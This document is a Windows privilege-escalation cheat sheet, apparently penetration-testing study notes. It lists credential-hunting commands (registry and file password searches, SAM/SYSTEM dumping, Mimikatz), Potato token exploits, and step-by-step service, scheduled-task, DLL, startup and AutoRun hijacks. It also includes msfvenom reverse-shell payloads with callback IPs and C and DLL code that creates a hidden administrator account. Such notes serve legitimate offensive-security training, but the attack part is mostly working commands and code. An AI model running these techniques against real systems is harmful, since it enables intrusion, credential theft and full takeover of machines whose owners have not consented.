# Methodology
- [ ] Basic Enumeration
- [ ] Privilege/Token Check
- [ ] AlwaysInstallElevated
- [ ] Logged in users/sessions
- [ ] Password policy
- [ ] Users & Groups
	- [ ] Privileged groups
- [ ] Running processes
	- [ ] Check which are owned by Administrator
- [ ] View History
	- [ ] Powershell History
	- [ ] PowerShell Transcript Files
- [ ] Interesting/Sensitive Files
- [ ] Credentials
- [ ] Internal ports
	- [ ] In addition to those only on localhost, crosscheck against initial nmap scan to find things that are blocked by firewall
- [ ] Scheduled Tasks
- [ ] Services
	- [ ] ModifybinPath, modify executable, DLL hihacking, unquoted service paths
- [ ] Recycle Bin
- [ ] Clipboard content
- [ ] Installed Applications
- [ ] Insecure GUI Apps
- [ ] Kernel Exploits
- [ ] Startup Apps (requires user login)
- [ ] AutoRuns (requires user login)

# 0) Basic Enumeration

Several key pieces of information we should obtain:
```
- Environment variables
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

```PowerShell
systeminfo
```
### Interesting/Sensitive Files
- PuTTY creds
- SSH host keys
	- C:\ProgramData\ssh\
		- ssh_host_rsa_key, ssh_host_ecdsa_key, ssh_host_ed25519_key
- Unattended.xml 
	- C:\Windows\Panther\Unattend\Unattended.xml
	- C:\Windows\System32\Sysprep\Unattend.xml
- SAM/SYSTEM (if SeBackupPrivilege, we can `reg save`)
	- C:\Windows\System32\Config\RegBack
- DB and logs files
	- dir C:\inetpub\ /s /b
	- dir C:\xampp\htdocs\ /s /b
	- dir C:\wamp\www\ /s /b
	- dir C:\Users\\\*\Documents\Projects\ /s /b
	- Look for config.php, .env, settings.py, web.config
### Windows Creds
- WinLogon (look for `DefaultUsername`, `DefaultPassword`, `AutoAdminLogon`)
- Credentials Manager (cmdkey /list)
- Windows Vault (`vaultcmd /list` and `vaultcmd /listcreds:"<Vault Path>"` OR `Get-VaultCredential` in PowerView)
- PowerShell Stored Credentials (look for `.clixml` or `.xml` files)
	- Search: `Get-ChildItem -Path C:\Users\ -Recurse -Include *.clixml,*.xml -ErrorAction SilentlyContinue`
	- Try to import and decrypt (only works as original user)
		- `$cred = Import-Clixml -Path "C:\path\to\file.clixml"` then, 
		- `$cred.GetNetworkCredential()`
- RDP Connections
	- `Get-ChildItem -Path C:\Users\ -Recurse -Include *.rdp -ErrorAction SilentlyContinue`
	- `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"`
	- `reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"`
- For cmd.exe specifically: `doskey /history`
- Sticky note data (Windows 10+)
	- `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`
	- Look for `plum.sqlite`, open it with any SQLite viewer
		- `sqlite3 plum.sqlite`

# 1) Privilege/Token Check
```powershell
whoami /priv
```
### Enumeration

| Token/Privilege            | Explanation                                                                                                                                                     |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SeImpersonatePrivilege`   | Potato exploits (especially when compromising IIS or any other service account)                                                                                 |
| `SeDebugPrivilege`         | Mimikatz                                                                                                                                                        |
| `SeAssignPrimaryPrivilege` | Similar to `SeImpersonatePrivilege`. Try Potato exploits                                                                                                        |
| `SeBackupPrivilege`        | Grants **read** access to all objects. Get SAM/SYSTEM by making your own readable backup of the system.                                                         |
| `SeRestorePrivilege`       | Grants **write** access to all objects. Try:<br>	- Modifying service binaries<br>	- Overwriting DLLs used by SYSTEM processes<br>	- Modifying registry settings |
| `SeTakeOwnershipPrivilege` | Lets user take ownership over an object. Once you own an object, you can try the same methods as listed above for `SeRestorePrivilege`                          |
| `SeTcbPrivilege`           |                                                                                                                                                                 |
| `SeCreateTokenPrivilege`   |                                                                                                                                                                 |
| `SeLoadDriverPrivilege`    |                                                                                                                                                                 |
| `SeManageVolumePrivilege`  | https://github.com/CsEnox/SeManageVolumeExploit                                                                                                                 |

### Attack

```bat
GodPotato.exe -cmd "cmd.exe /k whoami"
```
*Note: consider adding `-usevuln` flag*

```
SweetPotato.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```
Try running SweetPotato with some CLSID that can be found online:
```
SweetPotato.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -t {F87B28F1-DA9A-4E02-9C45-BD3E31398881}
```

# 2) AlwaysInstallElevated
If these 2 registers are enabled (value is `0x1`), then users of any privilege can install (execute) `.msi` files as NT AUTHORITY\SYSTEM:
```bat
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bat
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Privilege Escalation
Attack with PowerSploit (adds `.msi` to current directory that elevates privileges):
```PowerShell
Write-UserAddMSI
```

# 3) View History
Get-History:
```PowerShell
Get-History
```
PSReadLine (a second PS history log):
```PowerShell
(Get-PSReadlineOption).HistorySavePath
```

```bat
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Enumerate environment variables:
```bat
set
```
or
```PowerShell
Get-ChildItem Env:
```
# 4) Interesting Files
Useful files in user's directory:
```PowerShell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.settings,*.ini,*.log,*.kdbx,*.xml,*.config,*.doc,*.docx,*.pdf,*.xls,*.xlsx,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
```
Useful files everywhere (noisy):
```PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx,*.ini,*.txt,*.settings -File -Recurse -ErrorAction SilentlyContinue
```
Configuration / settings files in Program Files:
```PowerShell
Get-ChildItem -Path "C:\Program Files (x86)" -Include *.txt,*.settings,*.ini,*.log,*.kdbx,*.xml,*.config -File -Recurse -ErrorAction SilentlyContinue
```
```PowerShell
Get-ChildItem -Path "C:\Program Files" -Include *.txt,*.settings,*.ini,*.log,*.kdbx,*.xml,*.config -File -Recurse -ErrorAction SilentlyContinue
```
Search for file containing word `password` (case-insensitive):
```PowerShell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -List | Select-Object Path
```
```PowerShell
Get-ChildItem -Path C:\ -Include *.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -List | Select-Object Path
```

Some of the files below may be Base64 encoded:
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
### Remote Desktop Credentials Manager
`%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings`
Use the Mimikatz dpapi::rdg module with appropriate /masterkey to decrypt any .rdg files. You can extract many DPAPI masterkeys from memory with the Mimikatz sekurlsa::dpapi module

# 4.1) Sessions
If PuTTY is present:
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

# 4.2) Shadow Copies
- Must be **Backup Operator** or **Domain Admin** to leverage
```PowerShell
vssadmin list shadows
```
# 5) Credentials
Windows autologin
```PowerShell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

Cached creds:
```bat
cmdkey /list
```

SAM & SYSTEM can be found in `C:\Windows\System32\config`
Check SAM & SYSTEM readable:
```PowerShell
(Get-Acl "C:\Windows\System32\config\SAM").Access
```
Dump SAM + SYSTEM:
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Search registry for "*password*":
```bat
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Recursively search for files in the current directory that contain the word `password` and also end in either `.xml`, `.ini`, or `.txt`:
```
findstr /si password *.xml *.ini *.txt
```

# 6) Recycle Bin
Note the single quotes:
```PowerShell
Get-ChildItem -Path 'C:\$Recycle.Bin' -Force
```
Recover files:
```PowerShell
Copy-Item -Path 'C:\$Recycle.Bin\<SID>\<filename>' -Destination "C:\RecoveredFiles\"
```
# 7) Scheduled Tasks
***Remember you will not be able to see higher privileged Scheduled Tasks***
- AutoRuns
- List all scheduled tasks **your user** can see:
```PowerShell
Get-ScheduledTask | where {$_.TaskPath -notLike "\Microsoft*"} | ft TaskName,TaskPath,State
```
```bat
schtasks /query /fo LIST /v
```
### Privilege Escalation
1) For example, we find a PowerShell `.ps1` script that is being run every minute as the SYSTEM user
	1) We can check our privileges on this script with `icacls` or `accesschk.exe`
		1) `accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
		2) It appears we have the ability to write to this file
2) Backup the script
	2) `copy C:\DevTools\CleanUp.ps1 C:\Temp\`
3) Start a listener
4) Use `echo` to append a call to our reverse shell executable to the end of the script
	1) `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
5) Wait for the scheduled task to run to complete the exploit

# 8) Services
If services as running with SYSTEM privileges, we may be able to exploit them
- Goated (finds unquoted paths):
```bat
wmic service get name,pathname | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
- Check service auto-start on reboot:
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.StartMode -like 'Auto'}
```
- Query the configuration of a service:
	- `sc.exe qc <name>`
- Query the current status of a service:
	- `sc.exe query <name>`
- Modify a configuration option of a service:
	- `sc.exe config <name> <option>= <value>`
- Start/Stop a service:
	- `net start/stop <name>`

## **Service Misconfigurations**
1) **Insecure Service Properties**
2) **Unquoted Service Path**
3) **Weak Registry Permissions**
4) **Insecure Service Executables**
5) **DLL Hijacking**

### **8.1) Insecure Service Properties**
Each service has an ACL which defines certain service-specific permissions. Some permissions are innocuous (e.g., `SERVICE_QUERY_CONFIG`, `SERVICE_QUERY_STATUS`). Some may be useful (e.g., `SERVICE_STOP`, `SERVICE_START`). Some are dangerous (e.g., `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`)

### Insecure Service Permissions
**If our user has permissions to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.** 

> Potential Rabbit Hole: If you can change a service configuration but cannot start/stop the service, you may not be able to escalate privileges!

### Privilege Escalation
1) Run winPEAS to check for service misconfigurations:
	1) `.\winPEASany.exe quiet servicesinfo`
2) Note that we can modify the `daclsvc` service
3) We can confirm this with `accesschk.exe` or `icacls`:
	1) `.\accesschk.exe /accepteula -uwcqv user daclsvc`
4) Check the current configuration of the service:
	2) `sc.exe qc daclsvc`
5) Check the current status of the service:
	1) `sc.exe query daclsvc`
6) Reconfigure the service to use our reverse shell executable:
	2) `sc.exe config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""`
7) Start a listener, and then start the service to trigger the exploit:
	1) `net start daclsvc`

### **8.2) Unquoted Service Path**
Executables in Windows can be run without using their extension (e.g., `whoami.exe` can be run by just typing `whoami`). Some executables take arguments, separated by spaces, e.g., `someprog.exe arg1 arg2 arg3...`. This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Consider the following unquoted path: `C:\Program Files\Some Dir\SomeProgram.exe`

To us, this obviously runs `SomeProgram.exe`. To Windows, `C:\Program` could be the executable, with two arguments: `Files\Some` and `Dir\SomeProgram.exe`

If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

### Privilege Escalation
1) Run winPEAS to check for service misconfigurations:
	1) `.\winPEASany.exe quiet servicesinfo`
Manual (goated):
```bat
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
2) Note that the **unquotedsvc** service has an unquoted path that also contains spaces: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
3) Confirm this: `sc qc unquotedsvc`
4) Use `accesschk.exe` or `icacls` to check for write permissions:
	1) `icacls "C:\"`
	2) `icacls "C:\Program Files\"`
	3) `icacls "C:\Program Files\Unquoted Path Service\"`
5) Copy the reverse shell executable and rename it appropriately:
	1) `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
6) Start listener, then start the service to trigger the exploit:
	2) `net start unquotedsvc`

### **8.3) Weak Registry Permissions**
The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly.

### Privilege Escalation
1) Run winPEAS to check for service misconfigurations:
	1) `.\winPEASany.exe quiet servicesinfo`
2) Note that the `regsvc` service has a weak registry entry. We can confirm this with PowerShell:
	2) `Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List`
	3) Alternatively `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
3) Overwrite the `ImagePath` registry key to point to our reverse shell executable:
	1) `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
4) Start a listener, then start the service to trigger the exploit:
	2) `net start regsvc`

### **8.4) Insecure Services Executable**
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable.

### Privilege Escalation
1) Run winPEAS to check for service misconfigurations:
	1) `.\winPEASany.exe quiet servicesinfo`
2) Note that the `filepermsvc` service has an executable which appears to be writable by everyone. We can confirm this with `accesschk.exe` or `icacls`:
	2) `icacls "C:\Program Files\File Permissions Service\filepermservice.exe"`
	3) `.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
3) Create a backup of the original service executable:
	1) `copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp`
4) Copy the reverse shell executable to overwrite the service executable:
	2) `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"`
		1) *Note: `/Y` suppresses prompting to confirm that you want to overwrite an existing destination file*
5) Start a listener, then start the service to trigger the exploit:
	1) `net start filepermsvc`

### **8.5) DLL Hijacking**
Often a service will try to load DLL. If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in.

Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual. (`ProcMon.exe`)


Run `string64.exe` from Sysinternals to check if any DLL references are apparent.
### Privilege Escalation
1) Use `Get-ModifiableServiceFile` from **PowerUp.ps1**
2) Use WinPEAS to enumerate non-Windows services:
	1) `.\winPEASany.exe quiet servicesinfo`
2) Note that the `C:\Temp` directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:
	2) `.\accesschk.exe /accepteula -uvqc user dllsvc`
3) The `dllsvc` service is vulnerable to DLL Hijacking. According to the WinPEAS output, the service runs the `dllhijackservice.exe` executable. We can confirm this manually:
	1) `sc.exe qc dllsvc`
4) Run `Procmon64.exe` with administrator privileges. Press CTRL+L to open the Filter menu
5) Add a new filter on the **Process Name** matching `dllhijackservice.exe`
6) Add a new filter on the **Operation** so it **is** **CreateFile** 
	1) This will show all files (including DLLs) that the program opens
7) On the main screen, deselect **registry activity** and **network activity**
8) Start the service
	1) `net start dllsvc`
9) Back in Procmon, observe any "**NAME NOT FOUND**" errors, associated with the missing DLL
10) At some point, Windows tries to find the file in the `C:\Temp` directory, which as we found earlier, is writable by our user
11) On Kali, generate a reverse shell DLL named `hijackme.dll`:
	1) `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.111 LPORT=443 -f dll -o hijackme.dll`
	2) Alternatively, can use `adduser.c below
12) Copy the DLL to the Windows VM and into the `C:\Temp` directory. Start a listener, then stop/start the service to trigger the exploit:
	2) `net stop dllsvc`
	3) `net start dllsvc`

DLL code:
```CPP
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Then, compile with:
```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```
Or simply,
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.196 LPORT=53 -f dll -o winRev53.dll
```

### AddUser.exe
`adduser.c`:
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  # Domain user example below
  # i = system ("net localgroup Administrators \"MEDTECH\\Wario\" /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
Cross-compile the C code above to a 64-bit application:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

## 8.5.1 DLL Search Order Hijacking

Standard DLL search order on current Windows versions:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Windows first searches the application's directory. Interestingly, the current directory is at position 5. **When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.**

# 9) Installed Applications
Most privilege escalations relating to installed applications are based on misconfigurations we have already covered. Still, some privilege escalation results from things like buffer overflows, so knowing how to identify installed applications and known vulnerabilities is still important.

- Manually enumerate all running programs:
	- `tasklist /v`
- We can also use Seatbelt to search for nonstandard processes:
	- `.\seatbelt.exe NonstandardProcesses`
- winPEAS also has this ability (note the misspelling):
	- `winPEASany.exe quiet procesinfo`
## Exploit-DB
Once you find an interesting process, try to identify its version. You can try running the executable with `/?` or `-h`, as well as checking config or text files in the "Program Files" directory. Use Exploit-DB to search for a corresponding exploit. Some exploits contain instructions, while others are code that you will need to compile and run.
# 10) Insecure GUI Apps (Citrix Method)
**On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges.** There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. **Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.** I call this the "Citrix Method" because it uses many of the same techniques used to break out of Citrix environments.
### Privilege Escalation
1) For example, Log into the Windows VM using the GUI with the `user` account
2) For example, Double-click on the `AdminPaint` shortcut on the Desktop
3) Open a command prompt and run:
	1) `tasklist /V | findstr mspaint.exe`
	2) Note that `mspaint.exe` is running with admin privileges
4) In Paint, click "File", then "Open"
5) In the navigation input, replace the contents with:
	1) `file://c:/windows/system32/cmd.exe`
6) Press "Enter", a command prompt should open running with admin privileges



# 11) Kernel Exploits
```bat
systeminfo
```
Identify the hotfixes/patches:
```bat
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

> If we have an exploit written in Python but we don't have Python installed on victim, it can be transformed into binary with 
> `pyinstaller --onefile --noconsole exploit.py` 
> (Try with and without `--noconsole`)

- `wes-ng` Windows exploit suggester
- Precompiled exploits https://github.com/SecWiki/windows-kernel-exploits

# Requires User Login

## X) Startup Apps
```bat
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
Check if writable:
```bat
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.
### Privilege Escalation
Note that the shortcut files `.lnk` must be used. The following VBScript can be used to create a shortcut file:
```VBScript
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```
1) Use `icacls` or `accesschk.exe` to check permissions on the StartUp directory:
	1) `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
2) For example, Note that the `BUILTIN\Users` group has write access to this directory.
3) Create a file `CreateShortcut.vbs` with the VBScript provided in a previous slide. Change file paths if necessary.
4) Run the script (on Windows) using `cscript`:
	1) `cscript CreateShortcut.vbs`
5) Start a listener on Kali, then log in as the admin user to trigger the exploit







## X) AutoRuns
```bat
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
### Privilege Escalation
1) Use winPEAS to check for writable AutoRun executables:
	1) `.\winPEASany.exe quiet applicationsinfo`
	2) Or use `AutoRuns64.exe`
2) Alternatively, we could manually enumerate the AutoRun executables:
	1) `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
		1) and then use `accesschk.exe`or `icacls` to verify the permissions on each one:
			1) `icacls "C:\Program Files\Autorun Program\program.exe"`
			2) `.\accesschk.exe -accepteula -wvu "C:\Program Files\Autorun Programs\program.exe`
3) The `C:\Program Files\Autorun Program\program.exe` AutoRun executable is writable by `Everyone`. Create a backup of the original:
	1) `copy "C:\Program Files\Autorun Program\program.exe" C:\Temp`
4) Copy our reverse shell executable to overwrite the AutoRun executable:
	2) `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"`
5) Start a listener, and then restart the Windows VM to trigger the exploit. **Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the `user` account and log in as the `admin` account first.**
